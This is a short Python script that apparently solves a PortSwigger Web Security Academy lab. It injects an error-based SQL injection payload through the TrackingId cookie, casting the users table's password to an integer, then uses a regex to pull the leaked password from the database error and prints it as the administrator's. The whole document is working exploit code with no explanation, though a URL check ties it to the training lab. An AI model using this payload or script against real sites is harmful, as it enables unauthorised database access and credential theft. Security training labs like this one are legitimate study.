import requests
import string
import sys
import re

if len(sys.argv) != 2:
    print("")
    print("usage: python3 death.py <lab_url>")
    print("example: python3 death.py https://0a370067040af8c380b1354700e4006c.web-security-academy.net")
    exit()

lab_url = str(sys.argv[1])

if "web-security-academy" not in lab_url:
    print("wrong lab url.")
    exit()


trackingId="' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--"

cookies = {
       'TrackingId': trackingId
}

r = requests.get(lab_url, cookies=cookies)
#print(r.text)
matches = re.findall(r'invalid input syntax for type integer:\s*"([^"]+)"', r.text)

print("username: administrator, password: " + str(matches[0]))
